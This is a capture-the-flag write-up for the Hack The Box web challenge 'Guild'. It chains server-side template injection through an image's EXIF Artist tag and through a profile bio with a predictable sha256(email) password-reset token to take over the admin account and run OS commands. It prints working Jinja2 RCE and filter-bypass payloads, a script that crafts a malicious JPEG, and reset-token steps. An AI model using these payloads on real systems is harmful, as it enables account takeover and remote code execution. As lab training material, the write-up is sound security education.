# HTB — "Guild" (Web)

**Category:** Web  
**Difficulty:** Easy

---

## Challenge Description

> Welcome to the Guild! But please wait until our Guild Master verify you.

The challenge spawns a Docker instance exposed as an `IP:PORT` pair:

```text
154.57.164.65:32502
```

> The IP and port change every time the instance is respawned.

---

## Tooling

- `curl` / `requests` — to interact with the API
- `Pillow` + `piexif` — to craft a malicious JPEG with a custom EXIF tag
- A text editor — to read through the source code

---

## Recon: A Guild Membership App

The app is a Flask/Werkzeug application where users register, submit a "badge" (image) for verification by the Guild Master (admin), and once verified, gain access to a dashboard and profile page. The full source is provided, so static analysis is the primary method.

Key routes:

| Route | Description |
|---|---|
| `/signup` `/login` | Standard auth |
| `/verification` | Upload an image as identity document |
| `/admin` | Admin panel — lists pending verification requests |
| `/verify` | Admin-only POST — processes a verification request |
| `/profile` | Set a bio (once a verification record exists) |
| `/getlink` + `/user/<link>` | Generate and visit a public share profile |
| `/forgetpassword` + `/changepasswd/<hash>` | Password reset flow |

---

## Vulnerability 1 — SSTI via EXIF Artist Tag (`/verify`)

In `views.py`, when the admin processes a verification request:

```python
img = Image.open(query.doc)
exif_table = {}
for k, v in img.getexif().items():
    tag = TAGS.get(k)
    exif_table[tag] = v

if "Artist" in exif_table.keys():
    sec_code = exif_table["Artist"]
    query.verified = 1
    db.session.commit()
    return render_template_string("Verified! {}".format(sec_code))
```

The EXIF `Artist` tag of the uploaded image is passed **directly and without any filtering** into `render_template_string()`. This is a textbook Server-Side Template Injection: any Jinja2 expression placed in the `Artist` field is executed on the server when `/verify` is called.

The exploit payload placed in the `Artist` tag:

```
{{lipsum.__globals__['os'].popen('cp /app/flag.txt /app/website/static/flag.txt').read()}}
```

This copies the flag to the Flask static folder, making it accessible at `/static/flag.txt`. There is no sanitization on this code path — `lipsum`, `__globals__`, `os`, `popen` are all valid Jinja2 constructs here.

**The catch:** `/verify` requires `current_user.username == "admin"`, so we need admin access to trigger it.

---

## Vulnerability 2 — SSTI via Bio (`/user/<link>`)

In the share profile route:

```python
bio = Verification.query.filter_by(user_id=query1.id).first().bio
temp = open("/app/website/templates/newtemplate/shareprofile.html", "r").read()
return render_template_string(temp % bio, User=User, Email=email, username=query1.username)
```

The bio is inserted into the HTML template via Python's `%s` string formatting, and the result is passed to `render_template_string()`. Any Jinja2 expression in the bio executes. The `checkInput()` function attempts to block dangerous keywords:

```python
payloads = ["*", "__", "class", "base", "os", "popen", "globals", "attr", "eval", ...]
```

However, the SQLAlchemy `User` model is passed as a template variable (`User=User`), and the filter does not block `User`, `query`, `filter_by`, `first`, or `email`. This means the following payload bypasses `checkInput` entirely:

```
{{User.query.filter_by(username='admin').first().email}}
```

When the share profile is visited (no authentication required), this renders the admin's email address directly in the page. This is the pivot point to gain admin access.

---

## Vulnerability 3 — Predictable Password Reset Token

The forget-password flow in `views.py`:

```python
reset_url = str(hashlib.sha256(email.encode()).hexdigest())
new_query = Validlinks(email=email, validlink=reset_url)
```

The reset token is simply `sha256(email)`. Once the admin email is known (leaked via the bio SSTI above), the reset URL is trivially computable, and the admin password can be changed without any email delivery.

---

## Attack Chain

### Step 1 — Register and Upload the Malicious JPEG

Create an account and craft a JPEG with the EXIF `Artist` tag set to the SSTI payload:

```python
import piexif, io
from PIL import Image

payload = "{{lipsum.__globals__['os'].popen('cp /app/flag.txt /app/website/static/flag.txt').read()}}"
img = Image.new("RGB", (50, 50))
buf = io.BytesIO()
img.save(buf, format="JPEG")
exif_bytes = piexif.dump({"0th": {piexif.ImageIFD.Artist: payload.encode()}})
out = io.BytesIO()
piexif.insert(exif_bytes, buf.getvalue(), out)
```

Upload this JPEG to `/verification`. A `Verification` record is created with `verified=0` and the file path stored in `doc`.

### Step 2 — Leak the Admin Email via Bio SSTI

`/profile` only checks that a `Verification` record exists, not that it is approved. Since we just uploaded a document, we can immediately POST to `/profile`:

```
bio = {{User.query.filter_by(username='admin').first().email}}
```

Then create a share link via `/getlink` and visit `/user/hacker1337` (no auth required). The bio is rendered as a Jinja2 template and the admin's email appears in the page:

```
5a41446b6b704e48@master.guild
```

### Step 3 — Reset the Admin Password

Compute the reset token:

```python
import hashlib
token = hashlib.sha256("5a41446b6b704e48@master.guild".encode()).hexdigest()
# 70cebf4fa182341458c370e3394b342ff389126fc930adce6769a60dcb82f4b0
```

Trigger the `/forgetpassword` endpoint with the admin email to insert the token into the `Validlinks` table, then POST to `/changepasswd/<token>` with a new password.

### Step 4 — Trigger the EXIF SSTI as Admin

Login as admin and POST to `/verify` with the pending `verification_id`:

```bash
POST /verify
user_id=2&verification_id=1
```

The server opens our malicious JPEG, reads the `Artist` EXIF tag, and passes it to `render_template_string()`. The Jinja2 payload executes:

```
cp /app/flag.txt /app/website/static/flag.txt
```

Response: `Verified! ` (empty — `popen().read()` returns nothing for `cp`).

### Step 5 — Retrieve the Flag

```bash
curl http://154.57.164.65:32502/static/flag.txt
```

---

## The Flag

```text
HTB{REDACTED}
```

---

## Takeaways

- `render_template_string()` with any user-controlled input is SSTI, period — whether the input comes from a form field, a database column, or a binary file's metadata. EXIF tags are an especially sneaky vector since they look like image upload features.
- Client-side filtering (`checkInput`) is not a substitute for a proper allow-list or for avoiding dangerous patterns altogether. Here, the filter blocked many dangerous keywords but left the SQLAlchemy model (`User`) injectable in the template context, which was enough to leak secrets and pivot to full admin access.
- A password reset token derived solely from a known or discoverable value (such as an email address) provides no security. Reset tokens must be unpredictable (cryptographically random), short-lived, and single-use.
- The three vulnerabilities here chain naturally: SSTI in the bio leaks the admin email → predictable token resets the admin password → SSTI in the EXIF tag (accessible now as admin) executes arbitrary OS commands.
